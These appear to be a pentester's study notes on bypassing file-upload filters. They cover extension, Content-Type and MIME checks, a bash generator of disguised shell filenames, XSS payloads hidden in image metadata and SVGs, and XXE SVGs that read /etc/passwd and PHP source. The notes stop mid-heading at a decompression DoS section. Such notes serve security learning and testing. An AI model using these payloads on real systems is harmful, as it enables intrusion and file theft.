```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Bypassing Filters and Validation
### Client-side validation
- This can be bypassed by intercepting the request and sending it directly rather than via the website (eg. burp)

### File Extension Deny List
- In windows, file extensions are case insensitive
- Fuzz for if any extension variations are accepted ( [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP), and common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt))
### File Extension Allow List
- Fuzzing extensions is still useful to see what extensions are available, it may also show if any extensions are able to be bypassed 
- Use double stacked extensions, it may be that the filter only check if it contains, not ends with
- Character injection (these have specific ways to be used however but most lists will include it correctly)
	- `%20`
	- `%0a`
	- `%00`
	- `%0d0a`
	- `/`
	- `.\`
	- `.`
	- `…`
	- `:`
This script will generate all permutations of character injection using the above
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Content-Type Filtering
- As the `Content-Type` header is determined client-side, we can modify it with [[Burp Suite]]. We can fuzz using something like SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) to find which types are allowed.

### MIME-Type Filtering (File content inspection)
- These filters work by comparing the file's content to determine its MIME-Type. This is usually done by inspecting the first few bytes of the file's content to identify the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).
- The magic bytes for *GIFs* are actually ASCII printable bytes so they can be easily added by prefixing the file with `GIF87a`, `GIF89a`, or `GIF8`.

To determine what kind of filters are in place, we can try the following:

| MIME-Type  | Content-Type | Extension  | Result                              |
| ---------- | ------------ | ---------- | ----------------------------------- |
| Allowed    | Allowed      | Allowed    | Should work fine                    |
| Allowed    | Allowed      | Disallowed | Extension filtering                 |
| Allowed    | Disallowed   | Allowed    | Content-Type filtering              |
| Disallowed | Allowed      | Allowed    | MIME-Type filtering                 |
| Allowed    | Disallowed   | Disallowed | Content-Type &/ Extension filtering |
| Disallowed | Disallowed   | Allowed    | MIME-Type &/ Content-Type filtering |
| Disallowed | Allowed      | Disallowed | MIME-Type &/ Extension filtering    |

## Limited File Uploads
Some file upload forms will have protections that cannot be bypassed, however, this doesn't mean that we can't abuse these still...
### XSS
Javascript code could be included in an uploaded file (eg. image metadata) which might then be able to be used as a [[Cross-Site Scripting (XSS)#Stored XSS|Stored XSS]] exploit.
```bash
# Change the image metedata comment to include an XSS payload
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
```
If the metadata of an image was viewable on the site, it may allow for XSS. We might be able to change the image's MIME-Type to `text/html` which some applications may interpret as a HTML document instead of an image.

This can also be done for other formats like `SVG`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
	<rect x="1" y="1" width="1" height="1" fill="white" />
	<script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE
As `SVG` files are XML-based, we can also do XXE attacks via them.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
As reading files is particularly important for web applications, we might able to view source code. Eg.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
> XXE isn't limited to just SVGs, any file type that contains XML data can be used (eg. PDF, Word, PowerPoint). Many files use XML for its formatting.
> XXE can also be used to trigger SSRF attacks.

### DoS
Decompression 


